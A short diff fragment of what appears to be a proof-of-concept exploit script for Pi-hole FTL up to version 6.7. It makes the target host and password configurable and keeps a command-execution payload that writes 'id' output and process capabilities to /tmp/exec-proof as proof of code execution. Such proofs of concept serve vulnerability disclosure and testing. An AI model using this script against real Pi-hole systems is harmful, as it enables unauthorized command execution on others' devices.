@@ -15,8 +15,9 @@
 #
 # works on FTL <= 6.7
 #
-PIPASS="password"
-PIHOST="http://pi.hole"
+PIHOST="${PIHOST:-http://pi.hole}"
+PIPASS="${PIPASS:-password}"
+
 CMD="id > /tmp/exec-proof; grep Cap /proc/self/status >> /tmp/exec-proof"
 
 # Login (skip in no-password mode)
